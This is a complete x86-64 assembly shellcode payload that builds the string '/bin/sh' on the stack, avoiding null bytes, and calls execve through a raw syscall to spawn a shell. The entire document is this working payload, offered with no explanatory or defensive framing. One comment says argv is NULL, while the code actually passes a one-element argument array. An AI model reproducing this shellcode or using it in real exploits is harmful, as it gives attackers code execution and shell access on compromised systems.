[BITS 64]

start:
	; path="//bin/sh", argv=NULL, envp=NULL
	xor rdx, rdx
	
	mov qword rbx, 0x68732f6e69622f2f
	shr rbx, 4
	shr rbx, 4
	push rbx
	mov rdi, rsp
	
	push rdx
	push rdi
	mov rsi, rsp
	
	; Do the execve() call
	xor rax, rax
	mov al, 59
	syscall
	jmp $
